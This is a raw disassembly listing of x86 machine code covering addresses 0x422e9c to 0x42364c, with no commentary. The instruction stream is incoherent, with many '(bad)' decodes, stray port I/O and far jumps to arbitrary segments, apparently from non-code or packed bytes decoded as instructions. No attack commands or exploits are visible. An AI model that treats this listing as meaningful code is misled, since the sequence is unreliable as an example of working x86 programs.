  422e9c:	and    ecx,DWORD PTR [edi-0x3d]
  422e9f:	push   eax
  422ea0:	jp     0x422ea2
  422ea2:	jae    0x422e55
  422ea4:	add    BYTE PTR [edi-0x74d6abd3],dh
  422eaa:	mov    ebp,0x2af4398e
  422eaf:	ins    BYTE PTR es:[edi],dx
  422eb0:	or     eax,0x7b65639f
  422eb5:	(bad)  [ebp+ebx*4+0x78]
  422eb9:	loopne 0x422e5b
  422ebb:	jmp    0xf495:0x19f7
  422ec1:	ret    0x3076
  422ec4:	(bad)  
  422ec5:	xor    ebx,DWORD PTR [ecx]
  422ec7:	jg     0x422f36
  422ec9:	cmp    al,0xd
  422ecb:	sbb    eax,0x3a9fb33b
  422ed0:	sbb    eax,0xaca3afc
  422ed5:	fwait
  422ed6:	scas   al,BYTE PTR es:[edi]
  422ed7:	and    al,0xd1
  422ed9:	lahf   
  422eda:	arpl   WORD PTR [ecx+0x35],dx
  422edd:	enter  0x9c0e,0x24
  422ee1:	mov    edx,0x1fc68f93
  422ee6:	ror    DWORD PTR ds:0xeccec107,cl
  422eec:	dec    esp
  422eed:	cmc    
  422eee:	cmc    
  422eef:	ror    BYTE PTR [edi+0x110b79ac],1
  422ef5:	stc    
  422ef6:	cmp    ebx,DWORD PTR [ecx]
  422ef8:	ja     0x422e85
  422efa:	pop    edi
  422efb:	in     eax,dx
  422efc:	sub    bh,bh
  422efe:	mov    cl,0x1
  422f00:	es cmp bl,cl
  422f03:	push   esi
  422f04:	mov    ah,0xb
  422f06:	jbe    0x422f24
  422f08:	loope  0x422f17
  422f0a:	fcomp  QWORD PTR [edx]
  422f0c:	cld    
  422f0d:	and    DWORD PTR [edi-0x1a68e35a],edi
  422f13:	(bad)  
  422f14:	fcom   DWORD PTR [edi]
  422f16:	sbb    DWORD PTR [edi],edx
  422f18:	gs popa 
  422f1a:	stos   DWORD PTR es:[edi],eax
  422f1b:	call   0x84e8:0x5e9185f2
  422f22:	retf   
  422f23:	sbb    eax,DWORD PTR [edi+0x3e]
  422f26:	adc    DWORD PTR [edi-0x22f23835],0x9918471a
  422f30:	out    dx,al
  422f31:	xlat   BYTE PTR ds:[ebx]
  422f32:	ss in  al,0x61
  422f35:	xchg   edi,eax
  422f36:	add    BYTE PTR [ecx-0x2b],0x2a
  422f3a:	mov    bh,0x6f
  422f3c:	sbb    ebx,DWORD PTR [edx-0x766f2017]
  422f42:	mov    edx,0x4cd1
	...
  422f4f:	add    BYTE PTR [eax],al
  422f51:	add    dh,BYTE PTR [ebx]
  422f53:	mov    edi,DWORD PTR [eax]
  422f55:	mov    ebx,0xb63bb3b8
  422f5a:	fsubp  st(3),st
  422f5c:	mov    bh,0x84
  422f5e:	(bad)  
  422f5f:	sbb    eax,0x1a7edfc
  422f64:	add    BYTE PTR [ebx+eax*1+0xdbe0000],ch
  422f6b:	pop    ebp
  422f6c:	push   ebx
  422f6d:	and    eax,0xc2df8e43
  422f72:	sub    edx,ecx
  422f74:	inc    edi
  422f75:	fistp  DWORD PTR [edi]
  422f77:	jnp    0x422fd5
  422f79:	pusha  
  422f7a:	jl     0x422fe2
  422f7c:	jp     0x422f1c
  422f7e:	ret    0x1849
  422f81:	neg    BYTE PTR [eax-0x36]
  422f84:	test   DWORD PTR [edi-0xd5ff9e1],edx
  422f8a:	mov    al,ds:0x5fd01cde
  422f8f:	push   cs
  422f90:	xor    ch,BYTE PTR [ecx+0x1f]
  422f93:	js     0x422f7c
  422f95:	shl    BYTE PTR [edi-0x4b],0xb5
  422f99:	add    DWORD PTR gs:[ecx-0x3e],ecx
  422f9d:	scas   eax,DWORD PTR es:[edi]
  422f9e:	pusha  
  422f9f:	jo     0x422fe0
  422fa1:	cwde   
  422fa2:	mov    eax,0xaeffeab1
  422fa7:	dec    ebp
  422fa8:	pop    ecx
  422fa9:	call   0xd041:0xb3ea5d78
  422fb0:	mov    esp,0xa7afd75e
  422fb5:	in     al,0x25
  422fb7:	and    DWORD PTR [ebx+0x53],0xdb92cd20
  422fbe:	pop    edx
  422fbf:	or     cl,dl
  422fc1:	dec    ebx
  422fc2:	add    DWORD PTR [ebx+0x66],esp
  422fc5:	cdq    
  422fc6:	xor    esp,DWORD PTR ds:0x1c950fba
  422fcc:	test   ebp,eax
  422fce:	fwait
  422fcf:	loop   0x422f7c
  422fd1:	ret    
  422fd2:	arpl   dx,si
  422fd4:	mov    BYTE PTR [edx+0xd3631f2],ah
  422fda:	sar    BYTE PTR [ecx+0x53a9fdd2],1
  422fe0:	and    esp,DWORD PTR [ecx-0x27]
  422fe3:	dec    edi
  422fe4:	in     al,0x30
  422fe6:	sub    eax,0xad7167c3
  422feb:	jb     0x423017
  422fed:	or     eax,0xfaffe247
  422ff2:	call   0xf120b795
  422ff7:	iret   
  422ff8:	stos   DWORD PTR es:[edi],eax
  422ff9:	xchg   edi,eax
  422ffa:	add    al,0x6d
  422ffc:	mov    cl,0xf7
  422ffe:	jecxz  0x422fc4
  423000:	cmp    ecx,DWORD PTR [edx]
  423002:	mov    dh,0x1a
  423004:	stc    
  423005:	mov    edx,0xa35271bc
  42300a:	cmp    eax,0x55fd51aa
  42300f:	jecxz  0x423069
  423011:	and    eax,0x8c3c661e
  423016:	add    DWORD PTR [ebp+0x40745426],edx
  42301c:	adc    BYTE PTR [ebx],bl
  42301e:	data16 ror dh,1
  423021:	arpl   WORD PTR [esp+ecx*8+0x2e8b206b],si
  423028:	xchg   ecx,eax
  423029:	or     ah,bh
  42302b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42302c:	sbb    edx,DWORD PTR [ecx+0x43]
  42302f:	push   es
  423030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423031:	adc    DWORD PTR [esi-0x2b76f6d8],0xffffffcd
  423038:	add    DWORD PTR [ecx],eax
  42303a:	mov    dh,0x32
  42303c:	shr    DWORD PTR [ecx],1
  42303e:	pop    esp
  42303f:	(bad)  
  423040:	cli    
  423041:	dec    edi
  423042:	jmp    0xa8aa7a54
  423047:	jb     0x42309b
  423049:	jmp    0xccaa6557
  42304e:	push   edx
  42304f:	push   ebp
  423050:	stos   BYTE PTR es:[edi],al
  423051:	push   0x2c89a552
  423056:	rdpmc  
  423058:	shl    BYTE PTR [ebx-0x8],1
  42305b:	and    al,0xf7
  42305d:	and    BYTE PTR [ebp+0x5],dh
  423060:	mov    eax,0x47f521f0
  423065:	jg     0x423033
  423067:	cwde   
  423068:	fisubr WORD PTR [esi+0x37b37b42]
  42306e:	outs   dx,DWORD PTR ds:[esi]
  42306f:	pop    esi
  423070:	stos   BYTE PTR es:[edi],al
  423071:	jmp    0x4230b8
  423073:	fstp   st(3)
  423075:	push   ds
  423076:	or     BYTE PTR [edi+0x2587bb9d],dl
  42307c:	push   ss
  42307d:	scas   al,BYTE PTR es:[edi]
  42307e:	int3   
  42307f:	pop    edi
  423080:	xchg   ebp,eax
  423081:	sti    
  423082:	inc    edx
  423083:	push   cs
  423084:	jge    0x423104
  423086:	lahf   
  423087:	call   0xa3e9:0x5841aeea
  42308e:	out    0x45,eax
  423090:	jl     0x4230ba
  423092:	xchg   ebx,eax
  423093:	ja     0x42306f
  423095:	int3   
  423096:	pop    ebx
  423097:	into   
  423098:	pushf  
  423099:	das    
  42309a:	pop    ds
  42309b:	or     DWORD PTR [edx-0xa28b963],ebx
  4230a1:	jae    0x423066
  4230a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230a5:	scas   al,BYTE PTR es:[edi]
  4230a6:	aaa    
  4230a7:	rcr    DWORD PTR [edx-0x537b11fa],cl
  4230ad:	das    
  4230ae:	mov    bl,0x59
  4230b0:	stc    
  4230b1:	leave  
  4230b2:	push   ss
  4230b3:	stos   BYTE PTR es:[edi],al
  4230b4:	sub    ch,bl
  4230b6:	push   edi
  4230b7:	cli    
  4230b8:	(bad)  
  4230b9:	in     eax,dx
  4230ba:	data16 mov ?,WORD PTR [edi-0x59a4757b]
  4230c1:	and    dh,cl
  4230c3:	pop    ds
  4230c4:	hlt    
  4230c5:	ja     0x423054
  4230c7:	cmp    DWORD PTR [ebp+0xb],ebx
  4230ca:	(bad)  
  4230cb:	mov    esi,edx
  4230cd:	sub    al,0xb9
  4230cf:	nop
  4230d0:	mov    al,bl
  4230d2:	jge    0x423148
  4230d4:	jae    0x423118
  4230d6:	inc    edx
  4230d7:	jle    0x4230af
  4230d9:	jl     0x423060
  4230db:	xor    BYTE PTR [esp+ecx*2],ah
  4230de:	and    bh,BYTE PTR [eax-0x57]
  4230e1:	push   eax
  4230e2:	and    eax,0x257cdc34
  4230e7:	adc    bl,BYTE PTR [eax+eax*4]
  4230ea:	scas   al,BYTE PTR es:[edi]
  4230eb:	dec    ecx
  4230ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230ed:	or     bh,cl
  4230ef:	popa   
  4230f0:	or     ch,BYTE PTR [ebx-0x52]
  4230f3:	(bad)
  4230f8:	sub    BYTE PTR gs:[edi+0x42c3fa1e],ah
  4230ff:	es fwait
  423101:	dec    ebp
  423102:	iret   
  423103:	rol    DWORD PTR [esi],1
  423105:	pop    ds
  423106:	xor    ecx,DWORD PTR [ebx+0x2a]
  423109:	and    bh,BYTE PTR [edx-0x25bba9c1]
  42310f:	pop    ss
  423110:	add    eax,0x69a1da2a
  423115:	push   esi
  423116:	jmp    0x4230ab
  423118:	out    dx,al
  423119:	mov    ebp,0xaa23e764
  42311e:	cld    
  42311f:	mov    ah,0xe9
  423121:	cmp    DWORD PTR ds:0x9c20ace7,esi
  423127:	xchg   edx,eax
  423128:	ret    
  423129:	or     BYTE PTR [ecx],0x16
  42312c:	mov    edx,0x6b9b016b
  423131:	mov    al,0x1e
  423133:	enter  0xc23d,0x3a
  423137:	inc    edx
  423138:	pop    edi
  423139:	cmp    DWORD PTR [eax-0x300e4a],esp
  42313f:	sbb    ch,0x58
  423142:	out    0xb0,eax
  423144:	cmp    bl,ah
  423146:	icebp  
  423147:	rol    DWORD PTR [edx+eiz*1-0x65],cl
  42314b:	dec    edx
  42314c:	jmp    0xc3d1:0x6c47a352
  423153:	push   edx
  423154:	and    BYTE PTR [edx-0x5d],bl
  423157:	mov    al,BYTE PTR [edx+0x73e4b31e]
  42315d:	lock or DWORD PTR [edi+0x48],esp
  423161:	imul   DWORD PTR [esi]
  423163:	aas    
  423164:	mov    dl,0xe1
  423166:	arpl   WORD PTR [eax+0x7],dx
  423169:	cmp    BYTE PTR [ebx+0x28],al
  42316c:	jo     0x4230f2
  42316e:	sub    ebx,ebx
  423170:	sti    
  423171:	push   0xdece9c40
  423176:	or     al,BYTE PTR [eax+ebp*4-0x40927101]
  42317d:	and    ecx,ebx
  42317f:	adc    BYTE PTR [ecx],0x21
  423182:	stos   BYTE PTR es:[edi],al
  423183:	inc    esi
  423184:	fst    QWORD PTR [eax]
  423186:	das    
  423187:	push   ds
  423188:	sub    al,0xe1
  42318a:	inc    BYTE PTR [eax-0x62c0e9a0]
  423190:	int    0xad
  423192:	push   ss
  423193:	das    
  423194:	push   eax
  423195:	and    al,0xfd
  423197:	and    DWORD PTR [eax+0x54],eax
  42319a:	dec    esp
  42319b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42319c:	mov    dl,BYTE PTR [eax+0x1b062185]
  4231a2:	clc    
  4231a3:	cmp    BYTE PTR [edi+0x1233a254],ah
  4231a9:	imul   ebx,eax,0xffffffdc
  4231ac:	pop    esi
  4231ad:	xchg   esi,eax
  4231ae:	shr    BYTE PTR [edi-0x609f6600],cl
  4231b4:	mov    al,0x0
  4231b6:	(bad)  
  4231b8:	pop    ebp
  4231b9:	(bad)  
  4231ba:	xor    DWORD PTR [esi+0x4f453c4a],eax
  4231c0:	mov    edi,DWORD PTR [edi-0x509fd0f0]
  4231c6:	pop    edx
  4231c7:	sub    al,0xb2
  4231c9:	aaa    
  4231ca:	sar    bl,cl
  4231cc:	or     al,0xc0
  4231ce:	lds    ebp,FWORD PTR [edi-0x22b926cc]
  4231d4:	add    al,0x16
  4231d6:	xchg   ebp,eax
  4231d7:	(bad)  
  4231d8:	test   al,0xe4
  4231da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231db:	jo     0x423202
  4231dd:	(bad)  
  4231de:	jnp    0x4231a4
  4231e0:	cmp    eax,0x6135ba93
  4231e5:	cmp    DWORD PTR [ecx],ecx
  4231e7:	add    BYTE PTR [eax],dh
  4231e9:	xor    al,0x96
  4231eb:	push   0x16
  4231ed:	aaa    
  4231ee:	rcr    BYTE PTR [edx],0x50
  4231f1:	xor    edx,ebp
  4231f3:	jp     0x4231db
  4231f5:	dec    ecx
  4231f6:	into   
  4231f7:	xlat   BYTE PTR ds:[ebx]
  4231f8:	jnp    0x4231b0
  4231fa:	adc    DWORD PTR [ebx-0x2],ebp
  4231fd:	dec    edx
  4231fe:	push   0x9b888606
  423203:	push   es
  423204:	test   al,0x58
  423206:	or     DWORD PTR [esi],0x8bff199e
  42320c:	fwait
  42320d:	mov    dh,0xe5
  42320f:	inc    ebx
  423210:	mov    ebx,0x4133835a
  423215:	mov    dh,0xc8
  423217:	(bad)  [esi+0x574ce2e1]
  42321d:	add    bl,BYTE PTR [edx]
  42321f:	fs push ss
  423221:	inc    ecx
  423222:	cmc    
  423223:	arpl   bp,sp
  423225:	icebp  
  423226:	adc    al,0xa1
  423228:	call   0xc916:0x6017cc9f
  42322f:	push   esi
  423230:	hlt    
  423231:	mov    ah,0x98
  423233:	pop    ss
  423234:	sti    
  423235:	xchg   edi,esp
  423237:	in     eax,dx
  423238:	adc    DWORD PTR [esi-0x4f247da3],ecx
  42323e:	and    eax,0x6b7099ec
  423243:	xlat   BYTE PTR ds:[ebx]
  423244:	sbb    ah,BYTE PTR [edx-0x3613fcc7]
  42324a:	inc    eax
  42324b:	inc    ebx
  42324c:	aaa    
  42324d:	push   0xb4df54e8
  423252:	cmp    al,0x5f
  423254:	and    al,0x63
  423256:	cmp    BYTE PTR [ebp-0x76],bl
  423259:	shr    ebx,0xa5
  42325c:	add    esi,DWORD PTR [edi]
  42325e:	inc    esp
  42325f:	and    al,0x3c
  423261:	les    esi,FWORD PTR [eax-0x1f08928d]
  423267:	mov    al,BYTE PTR [ebx]
  423269:	and    DWORD PTR [ebx-0x3e5f95e0],ebp
  42326f:	mov    edx,0x4c497dff
  423274:	call   0x4ac26a98
  423279:	mov    dl,0x4
  42327b:	jae    0x4232af
  42327d:	adc    al,0xab
  42327f:	lea    eax,[edx]
  423281:	cmp    BYTE PTR [edi-0x2f],dh
  423284:	mov    dh,BYTE PTR [edi]
  423286:	push   0xffffffe5
  423288:	xchg   ebp,eax
  423289:	call   DWORD PTR [ecx]
  42328b:	fwait
  42328c:	dec    BYTE PTR ds:0x31714794
  423292:	and    ch,BYTE PTR [esi]
  423294:	or     ecx,DWORD PTR [edx+0x7698a541]
  42329a:	and    al,0xd2
  42329c:	adc    cl,ah
  42329e:	and    DWORD PTR [ebx+eax*2-0x37],edx
  4232a2:	inc    ebx
  4232a3:	sub    ebp,DWORD PTR [edx]
  4232a5:	and    BYTE PTR [edx-0x597c008d],cl
  4232ab:	outs   dx,BYTE PTR ds:[esi]
  4232ac:	lods   eax,DWORD PTR ds:[esi]
  4232ad:	push   ebx
  4232ae:	retf   
  4232af:	enter  0x6b37,0x98
  4232b3:	std    
  4232b4:	mov    eax,DWORD PTR [ecx]
  4232b6:	jge    0x423326
  4232b8:	ins    BYTE PTR es:[edi],dx
  4232b9:	sbb    al,0xa2
  4232bb:	cli    
  4232bc:	or     ebp,DWORD PTR [ebx]
  4232be:	into   
  4232bf:	inc    edi
  4232c0:	call   0xb20ab60f
  4232c5:	pop    ebp
  4232c6:	xchg   ebp,eax
  4232c7:	sub    al,0xc0
  4232c9:	dec    esi
  4232ca:	mov    ebp,0x9c4a26a
  4232cf:	stos   BYTE PTR es:[edi],al
  4232d0:	sub    DWORD PTR [eax+ebx*8],edi
  4232d3:	jns    0x91c7cad4
  4232d9:	jle    0x42325c
  4232db:	mov    ebx,0xaf7ae1e6
  4232e0:	and    edi,DWORD PTR [edx-0x4b]
  4232e3:	push   edi
  4232e4:	pushf  
  4232e5:	push   esp
  4232e6:	std    
  4232e7:	pop    ss
  4232e8:	jno    0x423365
  4232ea:	fstp   TBYTE PTR [ecx+0x2ee841fb]
  4232f0:	mov    eax,DWORD PTR [bp+di]
  4232f3:	adc    esi,0xa31654e0
  4232f9:	inc    esi
  4232fa:	outs   dx,BYTE PTR ds:[esi]
  4232fb:	adc    al,dl
  4232fd:	mov    ebp,0xb1ddc92c
  423302:	jmp    0x4232c8
  423304:	popf   
  423305:	cmp    al,0xa6
  423307:	je     0x4232e3
  423309:	ins    BYTE PTR es:[edi],dx
  42330a:	or     al,0xff
  42330c:	xchg   ecx,eax
  42330d:	and    al,0x4
  42330f:	fdiv   st(4),st
  423311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423312:	int    0x3e
  423314:	iret   
	...
  423321:	cli    
  423322:	dec    esp
  423323:	push   es
  423324:	ret    
  423325:	mov    dh,0xcb
  423327:	(bad)  
  423328:	jge    0x423393
  42332a:	cmp    ah,BYTE PTR [edi]
  42332c:	in     al,0xde
  42332e:	or     edi,edi
  423330:	pop    edx
  423331:	cdq    
  423332:	stos   DWORD PTR es:[edi],eax
  423333:	add    DWORD PTR [eax],eax
  423335:	lods   al,BYTE PTR ds:[esi]
  423336:	add    eax,DWORD PTR [eax]
  423338:	add    dh,cl
  42333a:	push   ss
  42333b:	pop    esi
  42333c:	pop    ebp
  42333d:	xchg   esp,eax
  42333e:	je     0x4233af
  423340:	xor    al,0x24
  423342:	inc    esi
  423343:	pop    edx
  423344:	xchg   DWORD PTR [ecx+0x40],esp
  423347:	xchg   esi,eax
  423348:	xor    al,0xab
  42334a:	dec    eax
  42334b:	mov    esi,0x7054d174
  423350:	push   cs
  423351:	pop    ebp
  423352:	sub    DWORD PTR [esi-0x7],ecx
  423355:	iret   
  423356:	fsub   DWORD PTR [ecx+0x73]
  423359:	add    BYTE PTR [ebp-0x72],0xb8
  42335d:	push   esi
  42335e:	cld    
  42335f:	cmp    DWORD PTR [esi+0x35f8374],0x28
  423366:	or     DWORD PTR [eax+0x38],esi
  423369:	lahf   
  42336a:	sbb    bh,BYTE PTR [ecx-0xd]
  42336d:	or     bh,ah
  42336f:	repz je 0x4233dc
  423372:	test   al,0xa4
  423374:	or     al,0x48
  423376:	adc    DWORD PTR [edx-0x62727e5b],0xffffffa9
  42337d:	xchg   esp,eax
  42337e:	mov    bh,0x39
  423380:	pop    eax
  423381:	loop   0x42338e
  423383:	cmp    al,0x39
  423385:	jecxz  0x4233a0
  423387:	cld    
  423388:	retf   
  423389:	lahf   
  42338a:	test   DWORD PTR [esi-0x35],ebx
  42338d:	push   cs
  42338e:	xchg   al,bl
  423390:	or     eax,0x89cb5f2e
  423395:	mov    ebx,0xb92405ad
  42339a:	pop    ebp
  42339b:	sbb    bh,cl
  42339d:	push   ss
  42339e:	fidiv  WORD PTR [ebx-0x395752e9]
  4233a4:	or     DWORD PTR [edx+0x5df47f4],ebx
  4233aa:	jp     0x4233a9
  4233ac:	mov    esi,0x74217db0
  4233b1:	xlat   BYTE PTR ds:[ebx]
  4233b2:	int3   
  4233b3:	sub    eax,0x66e30af5
  4233b8:	inc    edi
  4233b9:	ins    BYTE PTR es:[edi],dx
  4233ba:	jmp    0x4233ed
  4233bc:	daa    
  4233bd:	push   esp
  4233be:	mov    fs,WORD PTR ds:0x23f7731b
  4233c4:	clc    
  4233c5:	dec    eax
  4233c7:	pop    edx
  4233c8:	inc    eax
  4233c9:	addr16 dec sp
  4233cc:	es mov al,0xd7
  4233cf:	mov    DWORD PTR [edi+0x42],edi
  4233d2:	test   BYTE PTR [eax-0x25b0ffde],dh
  4233d8:	push   es
  4233d9:	rol    DWORD PTR [esi],cl
  4233db:	jbe    0x423423
  4233dd:	repnz xchg edi,eax
  4233df:	test   DWORD PTR [ebx+eiz*4+0x5691277],esi
  4233e6:	xchg   ecx,eax
  4233e7:	pop    ebp
  4233e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233e9:	cs or  dh,bh
  4233ec:	mov    ds:0x8199b0b9,eax
  4233f1:	sub    dl,BYTE PTR [edx-0x32]
  4233f4:	fwait
  4233f5:	lods   al,BYTE PTR ds:[esi]
  4233f6:	aad    0x9b
  4233f8:	daa    
  4233f9:	push   ecx
  4233fa:	xchg   esp,eax
  4233fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233fc:	adc    al,0xec
  4233fe:	ins    BYTE PTR es:[edi],dx
  4233ff:	pusha  
  423400:	sbb    BYTE PTR [edx+eiz*4+0x65e8b2d],dh
  423407:	mov    esp,0xcffed373
  42340c:	xchg   ecx,eax
  42340d:	push   0x1e
  42340f:	js     0x4233d7
  423411:	std    
  423412:	and    al,0x90
  423414:	popf   
  423415:	loope  0x42345f
  423417:	pop    eax
  423418:	or     BYTE PTR [edx+0x24],bl
  42341b:	cmc    
  42341c:	inc    esi
  42341d:	(bad)  
  42341e:	popa   
  42341f:	das    
  423420:	inc    eax
  423421:	les    esi,FWORD PTR [esi-0x4bd901e5]
  423427:	xor    ch,ch
  423429:	add    eax,0x7b590b49
  42342e:	cwde   
  42342f:	mov    WORD PTR [edi],gs
  423431:	jp     0x4234b0
  423433:	sbb    ecx,DWORD PTR [ebx+0x22]
  423436:	and    eax,0x139f1341
  42343b:	outs   dx,DWORD PTR ds:[esi]
  42343c:	jl     0x42344b
  42343e:	or     BYTE PTR ds:0x52195a30,dh
  423444:	and    eax,0x4c5036de
  423449:	imul   esi,eax,0xffffffe6
  42344c:	cli    
  42344d:	cld    
  42344e:	and    ah,BYTE PTR [ebp-0x80ba24c]
  423454:	sti    
  423455:	les    ecx,FWORD PTR [edi]
  423457:	into   
  423458:	shr    BYTE PTR [ebx],cl
  42345a:	inc    eax
  42345b:	ins    DWORD PTR es:[edi],dx
  42345c:	pop    ecx
  42345d:	jbe    0x423419
  42345f:	adc    edx,ecx
  423461:	adc    esi,DWORD PTR ds:0x8d8b9257
  423467:	fisttp WORD PTR [eax+0x4c]
  42346a:	in     eax,0x9c
  42346c:	fsub   DWORD PTR [edi]
  42346e:	sbb    edi,eax
  423470:	ins    BYTE PTR es:[edi],dx
  423471:	fwait
  423472:	mov    al,0xea
  423474:	es jmp 0x33ee:0xc559a7e0
  42347c:	outs   dx,BYTE PTR ds:[esi]
  42347d:	push   0x2
  42347f:	mov    ecx,0x2c33a5ac
  423484:	leave  
  423485:	jmp    0x42345c
  423487:	mov    edx,0xb924a572
  42348c:	aas    
  42348d:	and    DWORD PTR [esi-0x1b],0x79
  423491:	jl     0x423482
  423493:	icebp  
  423494:	push   esp
  423495:	inc    ebx
  423496:	ret    
  423497:	pop    eax
  423498:	sub    eax,0xdafa9325
  42349d:	fs jge 0x423465
  4234a0:	xsavec [ecx-0x69]
  4234a4:	imul   ecx,DWORD PTR [edi-0x2cf66b93],0x69
  4234ab:	jmp    0xa59cb465
  4234b0:	outs   dx,BYTE PTR ds:[esi]
  4234b1:	jmp    0x38f571ea
  4234b6:	xadd   DWORD PTR [edi+0x37],edx
  4234ba:	xchg   esp,eax
  4234bb:	mov    al,0x46
  4234bd:	cmp    bh,0x20
  4234c0:	mov    esp,0x25883e93
  4234c5:	inc    ebp
  4234c6:	xor    ebp,DWORD PTR [edx]
  4234c8:	xor    BYTE PTR [ecx-0x6698fc8],bh
  4234ce:	dec    ebx
  4234cf:	test   eax,0x657bb23d
  4234d5:	push   ds
  4234d6:	xchg   ah,dl
  4234d8:	(bad)  
  4234d9:	(bad)  
  4234da:	rol    BYTE PTR [ebx+0x11],0x46
  4234de:	fistp  DWORD PTR [ecx-0x1d]
  4234e1:	adc    DWORD PTR [ebx],edx
  4234e3:	inc    esi
  4234e4:	enter  0x554a,0x2c
  4234e8:	push   edx
  4234e9:	adc    BYTE PTR [eax],bh
  4234eb:	in     al,0x8f
  4234ed:	adc    bl,bh
  4234ef:	mov    ecx,0x445970a0
  4234f4:	inc    ecx
  4234f5:	inc    ecx
  4234f6:	stos   BYTE PTR es:[edi],al
  4234f7:	les    ebp,FWORD PTR [eax]
  4234f9:	mov    DWORD PTR [ecx-0x61],edx
  4234fc:	ins    BYTE PTR es:[edi],dx
  4234fd:	sub    al,0x9a
  4234ff:	(bad)  
  423500:	sti    
  423501:	addr16 xchg ebx,eax
  423503:	jle    0x42352d
  423505:	adc    al,0xbb
  423507:	cmp    al,0x58
  423509:	mov    bl,BYTE PTR [ebx]
  42350b:	dec    edi
  42350c:	fcom   QWORD PTR [ebx+0x2c220706]
  423512:	add    eax,0xdbf3ae6b
  423517:	cwde   
  423518:	adc    eax,0x95eeb741
  42351d:	mov    WORD PTR [ebx+0x360f8ac5],?
  423523:	mov    edi,DWORD PTR [ebp-0x84768b7]
  423529:	ss in  al,0xeb
  42352c:	xchg   esp,eax
  42352d:	jecxz  0x4234bc
  42352f:	jns    0x4234be
  423531:	cwde   
  423532:	mov    edx,?
  423534:	stos   DWORD PTR es:[edi],eax
  423535:	pushf  
  423536:	retf   0xbc19
  423539:	sub    al,0x7a
  42353b:	cdq    
  42353c:	cmc    
  42353d:	loope  0x42353e
  42353f:	mov    bh,0x26
  423541:	adc    al,0x2
  423543:	mov    DWORD PTR [ecx],ecx
  423545:	adc    ah,al
  423547:	and    al,0x60
  423549:	rcl    BYTE PTR [edi+0x61b0920e],1
  42354f:	enter  0xaeef,0xb4
  423553:	sbb    al,0xc1
  423555:	mov    dh,0x2b
  423557:	add    ah,BYTE PTR [ecx-0x61]
  42355a:	jns    0x423558
  42355c:	jnp    0x423559
  42355e:	xchg   ebx,eax
  42355f:	sub    al,0xcd
  423561:	rcr    BYTE PTR [edx-0x5d0badd8],0x83
  423568:	out    0x91,al
  42356a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42356b:	outs   dx,DWORD PTR ds:[esi]
  42356c:	mov    bh,0xee
  42356e:	sub    bl,BYTE PTR [ebx+0x6de684b0]
  423574:	pop    ds
  423575:	cmp    ebp,esp
  423577:	iretw  
  423579:	push   ds
  42357a:	mov    WORD PTR ds:0x48cfbe59,es
  423580:	and    esp,DWORD PTR [ebx-0x61a91ac8]
  423586:	mov    edi,0xc1a6dfe6
  42358b:	rcr    DWORD PTR [ebx-0x6b],1
  42358e:	dec    ebp
  42358f:	and    eax,0xa8b85cce
  423594:	and    al,0x36
  423596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423597:	lock dec edx
  423599:	add    dl,BYTE PTR [eax+0x5]
  42359c:	ret    
  42359d:	or     eax,DWORD PTR [ebx-0x36f8058b]
  4235a3:	(bad)  
  4235a4:	aas    
  4235a5:	mov    al,0x0
  4235a7:	mov    WORD PTR [ebp+0x59e61573],ss
  4235ad:	in     al,0x80
  4235af:	cmp    ah,dh
  4235b1:	sub    ebp,DWORD PTR [edi-0x58]
  4235b4:	push   esi
  4235b5:	lahf   
  4235b6:	cwde   
  4235b7:	mov    BYTE PTR cs:[edi-0x7103c8a2],dh
  4235be:	add    eax,0x43da6826
  4235c3:	rol    BYTE PTR [esi+0x29],0x2f
  4235c7:	push   0x25
  4235c9:	mov    WORD PTR [ebx],?
  4235cb:	adc    al,0x14
  4235cd:	test   al,cl
  4235cf:	adc    al,0x31
  4235d1:	bound  esp,QWORD PTR [ebp-0x1]
  4235d4:	sub    esi,esi
  4235d6:	out    dx,al
  4235d7:	or     ebx,DWORD PTR [ecx]
  4235d9:	repz xchg ebx,eax
  4235db:	lods   al,BYTE PTR ds:[esi]
  4235dc:	fs jmp 0xde662ebe
  4235e2:	ds cld 
  4235e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235e5:	mov    al,ds:0xb8bb82ba
  4235ea:	xchg   ebx,eax
  4235eb:	dec    edx
  4235ec:	clc    
  4235ed:	ins    DWORD PTR es:[edi],dx
  4235ee:	xchg   esp,eax
  4235ef:	xchg   edi,eax
  4235f0:	shl    BYTE PTR [edi+0x2c93a0e5],1
  4235f6:	xor    al,0x9d
  4235f8:	mov    esi,0x4bc71780
  4235fd:	or     ah,BYTE PTR [ebx-0x65269480]
  423603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423604:	pop    edi
  423605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423606:	add    DWORD PTR [ebp-0x57],edx
  423609:	retf   
  42360a:	adc    ebx,DWORD PTR [ebp+edi*1-0x2109de5e]
  423611:	lods   al,BYTE PTR ds:[esi]
  423612:	clc    
  423613:	sbb    DWORD PTR [ebx],eax
  423615:	call   0xfb28:0xcb779a63
  42361c:	scas   al,BYTE PTR es:[edi]
  42361d:	xor    eax,0x2b3f814
  423622:	xchg   esp,eax
  423623:	ror    esi,1
  423625:	cmp    ah,BYTE PTR [edx-0x22]
  423628:	cmc    
  423629:	(bad)  
  42362a:	jle    0xcf727ae4
  423630:	jg     0x423683
  423632:	push   ds
  423633:	sub    dh,ah
  423635:	leave  
  423636:	lods   al,BYTE PTR ds:[esi]
  423637:	mov    esi,0xf67ffe1d
  42363c:	aas    
  42363d:	pop    ecx
  42363e:	pop    ecx
  42363f:	pop    ecx
  423640:	lds    ebp,FWORD PTR [edx+eiz*2]
  423643:	mov    al,BYTE PTR [ecx]
  423645:	sbb    ecx,DWORD PTR [esi-0x48]
  423648:	pop    ecx
  423649:	(bad)  
  42364a:	jno    0x423694
  42364c:	shl    DWORD PTR [ebp-0x7b],cl
